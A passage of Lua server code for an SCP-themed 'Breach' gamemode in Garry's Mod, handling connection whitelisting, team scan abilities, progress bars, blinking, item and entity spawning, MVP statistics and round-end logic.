		add_admin_connection_log(steamID64)
	end
	
	if ( istable(tab) and allowedusergroups[string.lower(tab.group)] ) or WHITELISTED[steamID64] or WHITELISTED[util.SteamIDFrom64(steamID64)] then
		return true
	end

	if steamID64 != ninjaconnect_whitelist then
		if insaneconnect and (!istable(tab) or (tab.group != "superadmin") or steamID64 == util.SteamIDTo64(tostring(loudguest))) then
			return false, "КТО-ТО ИЗ РАЗРАБОТЧИКОВ ХОЧЕТ ГРОМКО ПОДКЛЮЧИТЬСЯ К СЕРВЕРУ ПОД АПЛОДИСМЕНТЫ!"
		end

		if sneakyconnect and (!istable(tab) or (tab.group == "user" or tab.group == "premium")) then
			return false, "Сервер полон"
		end
	end

	if Premium_Priority_Timer > CurTime() then
		if istable(tab) and tab.group != "user" then
			Premium_Priority_Timer = 0
			return true
		else
			return false, "Сервер полон"
		end
	end


	--[[
	if PlayerCount() >= 54 then
		local steamid = util.SteamIDFrom64(util.SteamIDFrom64(steamID64))
		local reserveslot = tonumber(util.GetPData(steamid, "ReserveSlots", "0"))
		if reserveslot == 0 then
			return false, "Сервер полон."
		else
			if reserveslot > os.time() then
				return true
			else
				util.RemovePData(steamid, "ReserveSlots")
				return false, "Сервер полон."
			end
		end
	end]]

	

end

util.AddNetworkString("BreachMuzzleflash")

--cw 2.0 & hab phys bullets muzzleflash fix
hook.Add("PhysBulletOnCreated", "CW20_HAB_CreateMuzzleFlash", function(ent, index, bullet, fromserver)
		if ent.GetActiveWeapon and IsValid(ent:GetActiveWeapon()) then
			if ent:GetActiveWeapon().CW20Weapon and ent:GetMoveType() != MOVETYPE_OBSERVER or ent:GetMoveType() != MOVETYPE_NOCLIP then
				--print("create fucking muzzleflash")
				net.Start("BreachMuzzleflash", true)
					net.WriteEntity(ent)
					net.WriteVector(ent:GetPos())
					net.WriteEntity(ent:GetActiveWeapon())
				net.SendPVS(ent:GetPos())
			end
		end
end)

net.Receive("NTF_Special_1", function( len, ply )
	local team_index = net.ReadUInt(12)

	PlayAnnouncer("nextoren/vo/ntf/camera_receive.ogg")

	local players = player.GetAll()

	local universal_search_targets = {

		[ TEAM_CHAOS ] = true,
		[ TEAM_GOC ] = true,
		[ TEAM_USA ] = true,
		[ TEAM_DZ ] = true,
		[ TEAM_COTSK ] = true,

	}


	local NTF_Targets = {}
	for i = 1, #players do
		local player = players[i]
		if player:GTeam() == TEAM_NTF then
			if player:GetRoleName() == role.NTF_Commander then

				player:SetSpecialCD(CurTime() + 120)
			end
		elseif team_index != 22 && player:GTeam() == team_index then
			NTF_Targets[ #NTF_Targets + 1 ] = player	
		elseif team_index == 22 && universal_search_targets[player:GTeam()] then
			NTF_Targets[ #NTF_Targets + 1 ] = player
		end
	end

	timer.Simple(15, function()
		if #NTF_Targets == 0 then
            PlayAnnouncer("nextoren/vo/ntf/camera_notfound.ogg")
            return
       end

		local userstosend = {}
	for i, v in pairs(player.GetAll()) do
		if v:GTeam() == TEAM_NTF then
			userstosend[#userstosend + 1] = v
		end
	end

	PlayAnnouncer("nextoren/vo/ntf/camera_found_1.ogg")

		net.Start("TargetsToNTFs")
		    net.WriteTable(NTF_Targets)
			net.WriteUInt(team_index, 12)
		net.Send(userstosend)
	end)
end)

net.Receive("CI_Special_1", function( len, ply )
	local team_index = net.ReadUInt(12)

	PlayAnnouncer("rxsend_music/camera_found_1.ogg")

	local players = player.GetAll()

	local universal_search_targets = {

		--[ TEAM_UIU ] = true,
		[ TEAM_GOC ] = true,
		[ TEAM_USA ] = true,
		[ TEAM_DZ ] = true,
		[ TEAM_COTSK ] = true,

	}


	local NTF_Targets = {}
	for i = 1, #players do
		local player = players[i]
		if player:GTeam() == TEAM_CHAOS then
			if player:GetRoleName() == role.Chaos_Scanning then

				player:SetSpecialCD(CurTime() + 9999)
			end
		elseif team_index != 22 && player:GTeam() == team_index then
			NTF_Targets[ #NTF_Targets + 1 ] = player	
		elseif team_index == 22 && universal_search_targets[player:GTeam()] then
			NTF_Targets[ #NTF_Targets + 1 ] = player
		end
	end

	timer.Simple(15, function()

		local userstosend = {}
	for i, v in pairs(player.GetAll()) do
		if v:GTeam() == TEAM_CHAOS then
			userstosend[#userstosend + 1] = v
		end
	end

	PlayAnnouncer("nextoren/vo/ntf/camera_found_123.ogg")

		net.Start("TargetsToCIs")
		    net.WriteTable(NTF_Targets)
			net.WriteUInt(team_index, 12)
		net.Send(userstosend)
	end)
end)

hook.Add("Initialize", "Remove_Xyi_Sv", function()
	hook.Remove("PlayerTick", "TickWidgets")
end)
	
// Variables
gamestarted = gamestarted or false
preparing = preparing || false
postround = postround || false
roundcount = roundcount || 0
BUTTONS = table.Copy(BUTTONS)

function GM:PlayerSpray( ply )
	if !ply:IsSuperAdmin() then
	    return true
	end
    --[[
	if ply:GTeam() == TEAM_SPEC then
		return true
	end
	if ply:GetPos():WithinAABox( POCKETD_MINS, POCKETD_MAXS ) then
		ply:PrintMessage( HUD_PRINTCENTER, "You can't use spray in Pocket Dimension" )
		return true
	end]]
end

function GetActivePlayers()
	local tab = {}
	for k,v in pairs(player.GetAll()) do
		if IsValid( v ) then
			if !v.hasloadedalready and !v:IsBot() then continue end
			if v.ActivePlayer == nil then
				v.ActivePlayer = true
			end

			if v.ActivePlayer == true or v:IsBot() then
				table.ForceInsert(tab, v)
			end
		end
	end
	return tab
end


function GetNotActivePlayers()
	local tab = {}
	for k,v in pairs(player.GetAll()) do
		if v.ActivePlayer == nil then v.ActivePlayer = true end
		if v.ActivePlayer == false then
			table.ForceInsert(tab, v)
		end
	end
	return tab
end

function GM:ShutDown()
	--
end

util.AddNetworkString( "StartBreachProgressBar" )

util.AddNetworkString( "SetBottomMessage" )

util.AddNetworkString( "TipSend" )

util.AddNetworkString( "EndRoundStats" )

util.AddNetworkString( "Ending_HUD" )

util.AddNetworkString( "LC_TakeWep" )

local mply = FindMetaTable( "Player" )

function mply:BreachNotifyFromServer(message)
    net.Start("BreachNotifyFromServer")
        net.WriteString(tostring(message))
    net.Send(self)
end

function NTF_CutScene(ply)

	ntf_body = ents.Create("ntf_cutscene")

	ntf_body:SetOwner(ply)

	ply:SetNWEntity("NTF1Entity", ntf_body)

	timer.Simple(3, function()
		ply:SetNWEntity("NTF1Entity", NULL)
	end)

end

function Scarlet_King_Summon()

	scarlet_king = ents.Create("ntf_cutscene")
	scarlet_king:Spawn()

end

function mply:Tip( str1, col1, str2, col2 )
	net.Start( "TipSend", true )
		net.WriteString( str1 )
		net.WriteColor( col1 )
		net.WriteString( str2 )
		net.WriteColor( col2 )
	net.Send( self )
end

function mply:BrProgressBar( name, time, icon, target, canmove, finishcallback, startcallback, stopcallback )
	if !canmove and self:GetVelocity():LengthSqr() > 100 then return end
	if istable(self.ProgressBarData) and self.ProgressBarData.name == name then return end
    local timername = "SHAKY_ProgressBar"..self:SteamID64()
    if timer.Exists(timername) then timer.Remove(timername) end
    if canmove == nil then canmove = true end

    self.ProgressBarData = {
    	name = name,
        target = target,
        canmove = canmove,
        stopcallback = stopcallback,
    }
    
	net.Start( "StartBreachProgressBar", true )
	    net.WriteString( name )
		net.WriteFloat( time )
		net.WriteString( icon )
	net.Send( self )
    if isfunction(startcallback) then startcallback() end
    timer.Create(timername, time, 1, function()
        if isfunction(finishcallback) then finishcallback() end
        self.ProgressBarData = nil
    end)
    
end

function mply:BrStopProgressBar(name)
	if name and self.ProgressBarData and self.ProgressBarData.name != name then return end
    self:ConCommand("stopprogress")
    if self.ProgressBarData and isfunction(self.ProgressBarData.stopcallback) then
        self.ProgressBarData.stopcallback()
    end
    self.ProgressBarData = nil
    timer.Remove("SHAKY_ProgressBar"..self:SteamID64())
end

local Shaky_DISTANCEREACH = 150
hook.Add("PlayerTick", "SHAKY_ProgressBarCheck", function( ply )
    if !ply.ProgressBarData then return end
    if !ply.ProgressBarData.canmove then
        if ply:GetVelocity():LengthSqr() > 100 then
            ply:BrStopProgressBar()
        end
    end
    if ply.ProgressBarData and IsValid(ply.ProgressBarData.target) then
        local dist = Shaky_DISTANCEREACH * Shaky_DISTANCEREACH
        if !( ply:GetEyeTrace().Entity == ply.ProgressBarData.target ) or ply.ProgressBarData.target:GetPos():DistToSqr(ply:GetPos()) > dist then-- or (IsValid(ply.ProgressBarData.target) and ply.ProgressBarData.target:GetPos():DistToSqr(ply:GetPos()) < dist) then
            ply:BrStopProgressBar()
        end
    end
    if ply:GTeam() == TEAM_SPEC or !ply:Alive() then ply:BrStopProgressBar() end
end)

function mply:setBottomMessage( msg )
    if isstring(msg) then msg = {english = msg} end
    net.Start( "SetBottomMessage", true )
        net.WriteTable( msg )
    net.Send( self )
end

function WakeEntity(ent)
	local phys = ent:GetPhysicsObject()
	if phys:IsValid() then
		phys:Wake()
		phys:SetVelocity( Vector( 0, 0, 25 ) )
	end
end

local next_Blink_think = next_Blink_think || 0
hook.Add("Think", "PlayerBlink_Think", function()
	if next_Blink_think > CurTime() then return end
	next_Blink_think = CurTime() + 3
	local plys = player.GetAll()
	local scp173 = player.GetAll()
	for i = 1, #scp173 do
		if IsValid(scp173[i]) and scp173[i]:GetRoleName() == "SCP173" then scp173 = scp173[i] end
	end
	if istable(scp173) then return end
	for i = 1, #plys do
		local ply = plys[i]
		if IsValid(ply) and ply:GTeam() != TEAM_SPEC and ply:GTeam() != TEAM_SCP then
			local cd = 3
			net.Start("PlayerBlink")
			net.WriteFloat(cd)
			net.Send(ply)
			if ply.usedeyedrops != true then
				ply.isblinking = true
				--BroadcastLua("local ply = Entity("..ply:EntIndex()..") if !IsValid(ply) then return end ply.isblinking = true")
				timer.Simple(cd, function()
					if IsValid(ply) then 
						ply.isblinking = false
						--BroadcastLua("local ply = Entity("..ply:EntIndex()..") if !IsValid(ply) then return end ply.isblinking = false")
					end
				end)
			end
		end
	end
end)

function PlayerNTFSound(sound, ply)
	if (ply:GTeam() == TEAM_GUARD or ply:GTeam() == TEAM_CHAOS) and ply:Alive() then
		if ply.lastsound == nil then ply.lastsound = 0 end
		if ply.lastsound > CurTime() then
			ply:PrintMessage(HUD_PRINTTALK, "You must wait " .. math.Round(ply.lastsound - CurTime()) .. " seconds to do this.")
			return
		end
		//ply:EmitSound( "Beep.ogg", 500, 100, 1 )
		ply.lastsound = CurTime() + 3
		//timer.Create("SoundDelay"..ply:SteamID64() .. "s", 1, 1, function()
			ply:EmitSound( sound, 450, 100, 1 )
		//end)
	end
end

function OnUseEyedrops(ply, type)
	if ply.usedeyedrops == true then
		ply:RXSENDNotify("Don't use them that fast!")
		return
	end
	ply.usedeyedrops = true
	ply:StripWeapon("item_eyedrops")
	local time = 10
	if type == 2 then time = 30 end
	if type == 3 then time = 50 end
	ply:RXSENDNotify("Used eyedrops, you will not be blinking for "..time.." seconds")
	timer.Create("Unuseeyedrops" .. ply:SteamID64(), time, 1, function()
		ply.usedeyedrops = false
		ply:RXSENDNotify("You will be blinking now")
	end)
end

/*timer.Create( "CheckStart", 10, 0, function() 
	if !gamestarted then
		CheckStart()
	end
end )*/

timer.Create("EffectTimer", 0.3, 0, function()
	for k, v in pairs( player.GetAll() ) do
		if v.mblur == nil then v.mblur = false end
		net.Start("Effect")
			net.WriteBool( v.mblur )
		net.Send(v)
	end
end )

/*nextgateaopen = 0
function RequestOpenGateA(ply)
	if preparing or postround then return end
	if !(ply:GTeam() == TEAM_GUARD or ply:GTeam() == TEAM_CHAOS) then return end
	if nextgateaopen > CurTime() then
		ply:PrintMessage(HUD_PRINTTALK, "You cannot open Gate A now, you must wait " .. math.Round(nextgateaopen - CurTime()) .. " seconds")
		return
	end
	local gatea
	local rdc
	for id,ent in pairs(ents.FindByClass("func_rot_button")) do
		for k,v in pairs(MAPBUTTONS) do
			if v["pos"] == ent:GetPos() then
				if v["name"] == "Remote Door Control" then
					rdc = ent
					rdc:Use(ply, ply, USE_ON, 1)
				end
			end
		end
	end
	for id,ent in pairs(ents.FindByClass("func_button")) do
		for k,v in pairs(MAPBUTTONS) do
			if v["pos"] == ent:GetPos() then
				if v["name"] == "Gate A" then
					gatea = ent
				end
			end
		end
	end
	if IsValid(gatea) then
		nextgateaopen = CurTime() + 20
		timer.Simple(2, function()
			if IsValid(gatea) then
				gatea:Use(ply, ply, USE_ON, 1)
			end
		end)
	end
end*/

function GetPocketPos()
	if istable( POS_POCKETD ) then
		return table.Random( POS_POCKETD )
	else
		return POS_POCKETD
	end
end

function UseAll()
	for k, v in pairs( FORCE_USE ) do
		local enttab = ents.FindInSphere( v, 3 )
		for _, ent in pairs( enttab ) do
			if ent:GetPos() == v then
				ent:Fire( "Use" )
				break
			end
		end
	end
end

function DestroyAll()
	for k, v in pairs( FORCE_DESTROY ) do
		if isvector( v ) then
			local enttab = ents.FindInSphere( v, 1 )
			for _, ent in pairs( enttab ) do
				if ent:GetPos() == v then
					ent:Remove()
					break
				end
			end
		elseif isnumber( v ) then
			local ent = ents.GetByIndex( v )
			if IsValid( ent ) then
				ent:Remove()
			end
		end
	end
end

MAPS_PROPS_CHANGESKINATBEGIN = {
	["models/props_guestionableethics/qe_console_large.mdl"] = true,
	["models/props_guestionableethics/qe_console_tall.mdl"] = true,
	["models/props_guestionableethics/qe_console_wide.mdl"] = true,
	["models/props_guestionableethics/console_wide.mdl"] = true,
	["models/props_guestionableethics/console_large_01.mdl"] = true,
	["models/props_guestionableethics/qe_console_wide2.mdl"] = true,
	["models/props_guestionableethics/qe_console_wide3.mdl"] = true,
	["models/props_gm/gadget03.mdl"] = true,
}

MAPS_PROPS_PAINTS = {
	["models/props_gffice/pictureframe04.mdl"] = 7,
	["models/props_gffice/pictureframe03.mdl"] = 2,
	["models/props_gffice/pictureframe02.mdl"] = 6,
	["models/props_gffice/pictureframe01b.mdl"] = 3,
	["models/props_gffice/pictureframe01a.mdl"] = 4,
}

MAPS_CHANGESKINPROPSTABLE = MAPS_CHANGESKINPROPSTABLE || {}

local invis_walls = {
	{
		model = "models/hunter/blocks/cube2x3x025.mdl",
		pos = Vector(-10370.071289063, -947.2763671875, 1807.2907714844),
		ang = Angle(89, 13, -167)
	},
	{
		model = "models/hunter/blocks/cube2x3x025.mdl",
		pos = Vector(-10445.60546875, -1025.646484375, 1812.4364013672),
		ang = Angle(89, 5, -85)
	},
	{
		model = "models/hunter/blocks/cube2x3x025.mdl",
		pos = Vector(-10517.3671875, -948.12384033203, 1803.6616210938),
		ang = Angle(89, 179, 180)
	},
	{
		model = "models/hunter/blocks/cube2x3x025.mdl",
		pos = Vector(-12100.602539063, 81.575531005859, 1816.8963623047),
		ang = Angle(89, 6, 96)
	},
	{
		model = "models/hunter/blocks/cube2x3x025.mdl",
		pos = Vector(-12180.704101563, 10.879002571106, 1817.0495605469),
		ang = Angle(89, -180, 180)
	},
	{
		model = "models/hunter/blocks/cube2x3x025.mdl",
		pos = Vector(-12096.01953125, -65.709251403809, 1814.2781982422),
		ang = Angle(89, -164, 106)
	},
	{
		model = "models/hunter/blocks/cube05x2x025.mdl",
		pos = Vector(-12031.115234375, -47.939987182617, 1804.0036621094),
		ang = Angle(0, 180, 90)
	},
	{
		model = "models/hunter/blocks/cube05x2x025.mdl",
		pos = Vector(-12025.399414063, 55.366954803467, 1812.4360351563),
		ang = Angle(-1, -91, 90)
	},
	{
		model = "models/hunter/blocks/cube025x05x025.mdl",
		pos = Vector(-12031.263671875, -29.374631881714, 1786.7794189453),
		ang = Angle(0, 90, 0)
	},
	{
		model = "models/hunter/blocks/cube025x05x025.mdl",
		pos = Vector(-12031.2578125, -29.72864151001, 1819.7947998047),
		ang = Angle(0, 90, 0)
	},
	{
		model = "models/hunter/blocks/cube05x2x025.mdl",
		pos = Vector(-10493.869140625, -870.31317138672, 1805.0111083984),
		ang = Angle(-1, 0, 89)
	},
	{
		model = "models/hunter/blocks/cube025x05x025.mdl",
		pos = Vector(-10404.943359375, -876.21588134766, 1776.6730957031),
		ang = Angle(-1, -180, 0)
	},
	{
		model = "models/hunter/blocks/cube025x05x025.mdl",
		pos = Vector(-10405.659179688, -876.33947753906, 1809.8189697266),
		ang = Angle(-1, -180, 0)
	},
}

function SpawnInvisibleWalls()

	for i = 1, #invis_walls do
		local tab = invis_walls[i]

		local prop = ents.Create("prop_dynamic")
		local savepos = tab.pos
		prop:SetPos(savepos)
		prop:SetAngles(tab.ang)
		prop:SetModel(tab.model)
		prop:Spawn()
		prop:SetMoveType(MOVETYPE_NONE)
		prop:SetCollisionGroup(COLLISION_GROUP_PLAYER)
		prop:PhysicsInit(SOLID_NONE)
		prop:SetSolid(SOLID_VPHYSICS)
		prop:SetNoDraw(true)

		prop.Think = function(self)
			self:SetPos(savepos)
			self:NextThink( CurTime() + 0.25 )
	    	return true
		end

	end

end

function EnableCollisionForDoors()

	for i, v in pairs(ents.FindByClass("func_door")) do
		if IsValid(v:GetChildren()[1]) then
			v:GetChildren()[1]:SetCustomCollisionCheck(true)
		end
		v:SetCustomCollisionCheck(true)
	end
end

function SpawnWW2TDMProps()
	for i = 1, #WW2_MAP_CONFIG1 do
		local data = WW2_MAP_CONFIG1[i]
		local prop = ents.Create("prop_dynamic")
		prop:SetModel(data.model)
		prop:SetSkin(data.skin)
		prop:SetBodyGroups(data.bodygroups)
		--prop:SetCollisionGroup(COLLISION_GROUP_)
		prop:SetMoveType( MOVETYPE_NONE )
		prop:SetSolid( SOLID_VPHYSICS )
		prop:SetPos(data.pos)
		prop:SetAngles(data.ang)
		prop:Spawn()
		if !data.shouldcollide then
			prop:SetCollisionGroup(20)
		end
		local physobj = prop:GetPhysicsObject()
		if IsValid(physobj) then
			physobj:EnableMotion(false)
		end
	end
end

local MVPData = {
	
	scpkill = "l:mvp_scpkill",
	
	headshot = "l:mvp_headshot",
	
	kill = "l:mvp_kill",
	
	heal = "l:mvp_heal",
	
	damage = "l:mvp_damage",

}

function MakeMVPMenu(type)

	if !MVPStats or !MVPStats[type] then return end

	local data = {
		title = MVPData[type],
		plys = {}
	}

	local foundplys = {}

	for id, val in pairs(MVPStats[type]) do

		local ply = player.GetBySteamID64(id)

		if !ply then continue end

		foundplys[#foundplys + 1] = {
			name = ply:Name(),
			id = id,
			value = val
		}

	end

	table.SortByMember(foundplys, "value")

	for i = 1, math.min(9, #foundplys) do

		data.plys[#data.plys + 1] = foundplys[i]

	end

	net.Start("MVPMenu")
	net.WriteTable(data)
	net.Broadcast()

end

function makeMVPScore()
	local a = 0
	for i, _ in pairs(MVPStats) do
	
		timer.Simple(a, function()

			MakeMVPMenu(i)

		end)

		a = a + 5
	end
end

function Spawn294()
	local scp = ents.Create("ent_scp_294")

   scp:SetAngles(Angle(0,90,0))
   scp:SetPos(Vector(150.771698, 3100.336182, -127.500443))

   scp:Spawn()
end

function SpawnShawm()
	local positions = {
		Vector(3687.0190429688, 1752.87890625, 10.03125),
		Vector(3306.0393066406, 5478.642578125, 10.03125),
		Vector(5927.0239257813, 2122.2731933594, 10.03125),
	}

	local shawm = ents.Create("ent_shawm")
	shawm:SetPos(positions[math.random(1, #positions)])
	shawm:Spawn()
end

local notalwaysspawnlist = {
	["battery_1"] = true,
	["battery_2"] = true,
	["battery_3"] = true,
}

function SpawnTrashbins()
	for i = 1, #SPAWN_TRASHBINS do
		local data = SPAWN_TRASHBINS[i]

		local trashbin = ents.Create("prop_physics")
		trashbin:SetModel("models/props_beneric/trashbin002.mdl")
		trashbin:SetPos(data.pos)
		trashbin:SetAngles(data.ang)
		trashbin:SetCollisionGroup(COLLISION_GROUP_DEBRIS_TRIGGER)
		trashbin:Spawn()
		trashbin:SetModelScale(1.5)
		trashbin:SetNoDraw(true)
		local phy = trashbin:GetPhysicsObject()
		if IsValid(phy) then
			phy:EnableMotion(false)
		end
	end
end


function SpawnAllItems()

	local bigr = IsBigRound()

	local card = ents.Create("prop_physics")
	card:SetModel("models/cultist/items/keycards/w_keycard.mdl")
	card:SetPos(Vector(559.33215332031, -4835.857421875, -1243.48046875))
	card:SetSkin(5)
	card:SetAngles(Angle(0,180,0))
	card:Spawn()

	local zones = {
		"LZ",
		"EZ",
		"HZ"
	}

	local keys_zone = table.remove(zones, math.random(1, #zones))
	local rph_zone = table.remove(zones, math.random(1, #zones))
	local hand_zone = table.remove(zones, math.random(1, #zones))

	local spawns = table.Copy(SPAWN_SCP_OBJECT.spawns)
	local scps = table.Copy(SPAWN_SCP_OBJECT.ents)
	for i = 1, 7 do
		local spawn = table.remove(spawns, math.random(1, #spawns))
		local ent = table.remove(scps, math.random(1, #scps))

		local scp = ents.Create(ent)
		scp:SetPos(spawn)
		scp:Spawn()
	end

	if bigr and math.random(1,100) <= 70 then
		local pestol = ents.Create("cw_kk_ins2_bocchi")
		pestol:SetPos(Vector(7680.0034179688, -5321.6171875, 172.81292724609))
		pestol:Spawn()
	end

	if math.random(1,100) <= 70 then
		local pestol = ents.Create("scp_035_real")
		pestol:SetPos(Vector(5207.953613, -1054.333374, 0.031250))
		pestol:Spawn()
	end

	local intercom = ents.Create("object_intercom")
	intercom:SetPos(Vector(-2610.555664, 2270.446777, 320.494934))
	intercom:Spawn()

	for spawnid = 1, #BREACH.LootSpawn do
		local used = {}
		local currentspawns = BREACH.LootSpawn[spawnid]

		local cusp = currentspawns

		local currentamount = #currentspawns.spawns

		if bigr then
			local val1, val2 = currentspawns.bigroundamount[2], currentspawns.bigroundamount[1]
			currentamount = math.floor(currentamount*math.Rand(math.min(val1, val2), math.max(val1, val2)))
		else
			local val1, val2 = currentspawns.smallroundamount[2], currentspawns.smallroundamount[1]
			currentamount = math.floor(currentamount*math.Rand(math.min(val1, val2), math.max(val1, val2)))
		end

		local spawnslist = table.Copy(currentspawns.spawns)

		local lootlist = cusp.lootrules

		for i = 1, currentamount do

			local currentitem

			if cusp.shouldalwaysspawn and i <= #cusp.shouldalwaysspawn then
				currentitem = cusp.shouldalwaysspawn[i]
			else
				local repetition = 0
			    ::repeatitempick::
			    repetition = repetition + 1

			    if repetition >= 100 then print("TOO MANY REPETITIONS, STOP SPAWNNAME:"..cusp.spawnname) break end -- to fix errors
			        
				local item = lootlist[math.random(1, #lootlist)]

				if istable(item) then
					if !bigr and item.bigroundonly then
						goto repeatitempick
					end
			        if item.chance then
						local rand = math.random(1, 100)
						if rand > item.chance then
							goto repeatitempick
						end
					end
					if item.amount then
						if used[item[1]] and used[item[1]] >= item.amount then
							goto repeatitempick
						else
							if !used[item[1]] then
								used[item[1]] = 1
							else
								used[item[1]] = used[item[1]] + 1
							end
						end
					end
					currentitem = item[1]
				else
					currentitem = item
				end

			end

			if i == 1 and cusp.zone == keys_zone then
				currentitem = "item_keys"
			end
			if i == 1 and cusp.zone == rph_zone then
				currentitem = "item_chaos_radio"
			end
			if i == 1 and cusp.zone == hand_zone then
				currentitem = "hand_key"
			end

			if notalwaysspawnlist[currentitem] and math.random(1,100) <= 50 then continue end

			if currentitem != "nil" then

				local spawnpoint = table.remove(spawnslist, math.random(1, #spawnslist))
				local ang = angle_zero

				if istable(spawnpoint) then
					ang = spawnpoint[2]
					spawnpoint = spawnpoint[1]
				end

				if cusp.addz and !string.StartWith(currentitem, "armor_") then spawnpoint = spawnpoint + Vector(0,0, cusp.addz) end

				local item = ents.Create(currentitem)
				item:SetPos(spawnpoint)
				item:SetAngles(ang)
				item:Spawn()

			end

		end

	end

	local jeep_1 = ents.Create("prop_vehicle_jeep")
	jeep_1:SetModel("models/scpcars/scpp_wrangler_fnf.mdl")
	jeep_1:SetKeyValue("vehiclescript", "scripts/vehicles/wrangler88.txt")
	jeep_1:SetPos(Vector(1663.5623779297, 6771.1870117188, 1507.625))  
	jeep_1:SetAngles(Angle(0, 180, 0))
	jeep_1:Spawn()

	local gauss = ents.Create("weapon_special_gaus")
	gauss:SetPos( SPAWN_GAUSS )
	gauss:Spawn()

	for _, v in pairs(SPAWN_TESLA) do
			local tesla = ents.Create( "test_entity_tesla" )
			if IsValid( tesla ) then
				tesla:Spawn()
				tesla:SetPos( v )
				if v == Vector(4157.9526367188, -932.20758056641, 129.061511993408) then
					tesla:SetAngles( Angle(0, 90, 0))
				elseif v == Vector(6282.9453125, 1177.1953125, 129.061498641968) then
					tesla:SetAngles( Angle(0, 90, 0))
				elseif v == Vector(3522.5834960938, 4021.2414550781, 129.061498641968) then
					tesla:SetAngles( Angle(0, 90, 0))
				elseif v == Vector(8168.5478515625, 336.69119262695, 129.061496734619) then
					tesla:SetAngles( Angle(0, 90, 0))
				elseif v == Vector(4158.148926, 1878.148560, 129.361298) then
					tesla:SetAngles( Angle(0, 90, 0))
				end
			end
	end

	for i = 1, #ENTITY_SPAWN_LIST_SHAKY do
		local tab = ENTITY_SPAWN_LIST_SHAKY[i]
		local spawns = tab.Spawns
		for i = 1, #spawns do
			local spawn = spawns[i]
			local pos = spawn.pos || spawn
			local ang = spawn.ang || Angle(0,0,0)
			MsgC(Color(255,0,0), "[RXSEND Breach]", color_white, " Spawning "..tab.Class.." on coordinate: "..tostring(pos.x)..", "..tostring(pos.y)..", "..tostring(pos.z)..".")
			local ent = ents.Create(tab.Class)
			ent:SetPos(pos)
			ent:Spawn()
			ent:SetPos(pos)
			ent:SetAngles(ang)
		end
	end

	local goc_copy = table.Copy(SPAWN_GOC_UNIFORMS)

	timer.Simple(2, function()
		for i = 1, 2 do
			local ent = ents.Create("armor_goc")
			ent:SetPos(table.remove(goc_copy, math.random(1, #goc_copy)))
			ent:Spawn()
		end
	end)

	local gen_spawncopy = table.Copy(SPAWN_GENERATORS)
	for i = 1, 5 do
		local generator = ents.Create("ent_generator")
		local spawntable = table.remove(gen_spawncopy, math.random(1, #gen_spawncopy))
		generator:SetPos(spawntable.Pos)
		generator:SetAngles(spawntable.Ang)
		generator:Spawn()
	end

	local obr_call = ents.Create("obr_call")
	obr_call:Spawn()

	local tree = ents.Create("scptree")
	tree:Spawn()

	local goc_nuke = ents.Create("entity_goc_nuke")
	goc_nuke:SetPos(Vector(-707.59704589844, -6296.330078125, -2345.68359375))
	goc_nuke:SetAngles(Angle(-34.56298828125, 1.0986328125, 89.258422851563))
	goc_nuke:Spawn()

	local scp914 = ents.Create("entity_scp_914")
	scp914:Spawn()

	Spawn294()

end




function spawn_random_obr()
	
			local obr_call2 = ents.Create("obr_call2")
            obr_call2:SetPos( Vector(-800.853540, 6090.688965, 296.807666))
            obr_call2:SetAngles( Angle( 90, -270, 0))
            obr_call2:Spawn()

end

function OnlyAliveRoles(tab)

	local tab2 = {
		dz_alive = false,
		goc_alive = false,
		sci_alive = false,
		mtf_alive = false,
		sec_alive = false,
		ci_alive = false,
		classd_alive = false,
		scp_alive = false,
		fbi_alive = false,
	}
	local ret = true
	for _, ply in ipairs(player.GetAll()) do
		local gteam = ply:GTeam()
		if ply:Health() <= 0 then continue end
		if !ply:Alive() then continue end
		if gteam == TEAM_GUARD or gteam == TEAM_NTF or gteam == TEAM_QRT then tab2.mtf_alive = true
		elseif gteam == TEAM_DZ and ply:GetRoleName() != "SH Spy" then tab2.dz_alive = true
		elseif gteam == TEAM_SECURITY or ply:GTeam() == "CI Spy" then tab2.sec_alive = true
		elseif gteam == TEAM_SCP then tab2.scp_alive = true
		elseif gteam == TEAM_FBI then tab2.fbi_alive = true
		elseif gteam == TEAM_CLASSD or ply:GetRoleName() == "GOC Spy" then tab2.classd_alive = true
		elseif gteam == TEAM_CHAOS then tab2.ci_alive = true
		elseif gteam == TEAM_SCI or gteam == TEAM_SPECIAL or ply:GetRoleName() == "SH Spy" then tab2.sci_alive = true
		end
	end

	for name, val in pairs(tab2) do
		if !table.HasValue(tab, name) and val == true then ret = false break end
	end

	return ret

end

timer.Create("EndRound_Timer", 1, 0, function()
	if preparing then return end
	if postround then return end
	if !gamestarted then return end
	if GetGlobalBool("Evacuation", false) then return end

	local alive = false
	local res = false

	local plys = player.GetAll()

	for i = 1, #plys do

		local ply = plys[i]

		if ply:GTeam() != TEAM_SPEC then
			alive = true
		end

	end

	if !alive then
		net.Start("New_SHAKYROUNDSTAT")	
			net.WriteString("l:roundend_nopeoplealive")
			net.WriteFloat(27)
		net.Broadcast()
		res = true
	end
	if activeRound and activeRound.name == "WW2 TDM" and !res then
		local nazi = gteams.NumPlayers(TEAM_NAZI)
		local usa = gteams.NumPlayers(TEAM_AMERICA)

		if usa <= 0 then
			activeRound.postround()
			res = true
		elseif nazi <= 0 then
			activeRound.postround()
			res = true
		end
	end
	if res then
		timer.Remove("NTFEnterTime")
		timer.Remove("NTFEnterTime2")
		timer.Remove("NTFEnterTime3")
		timer.Remove("Evacuation")
		timer.Remove("EvacuationWarhead")
		postround = true
		timer.Simple(27, function()
			RoundRestart()
		end)
	end
end)

function SetBloodyTexture(ent)

	local sModelPath = ent:GetModel()
	local sTest =	string.Explode( "", sModelPath )
	local stringpath = ""
	local countslash = 0

	for _, v in ipairs( sTest ) do

		if ( v == "/" ) then

			countslash = countslash + 1

		end

		if ( countslash == 3 ) then

			stringpath = stringpath .. v

		elseif ( countslash == 4 ) then

			if ( !string.EndsWith( stringpath, "/" ) ) then

				stringpath = stringpath .. "/"

			end

		end

	end

	for k, v in ipairs( ent:GetMaterials() ) do

		local sNewmaterial;
		if ( !string.find( v, "/heads/" ) && !string.find( v, "/shared/" ) ) then

			sNewmaterial = string.Replace( v, stringpath, "/zombies" .. stringpath )

		end


		ent:SetSubMaterial( k - 1, sNewmaterial )

	end

end

function SetZombie1( ent )
	if ent:IsPlayer() then
		if ent:GTeam() != TEAM_SPEC or ent:GTeam() != TEAM_SCP then

			local sModelPath = ent:GetModel()
			local sTest =	string.Explode( "", sModelPath )
			local stringpath = ""
			local countslash = 0
		
			for _, v in ipairs( sTest ) do
		
				if ( v == "/" ) then
		
					countslash = countslash + 1
		
				end
		
				if ( countslash == 3 ) then
		
					stringpath = stringpath .. v
		
				elseif ( countslash == 4 ) then
		
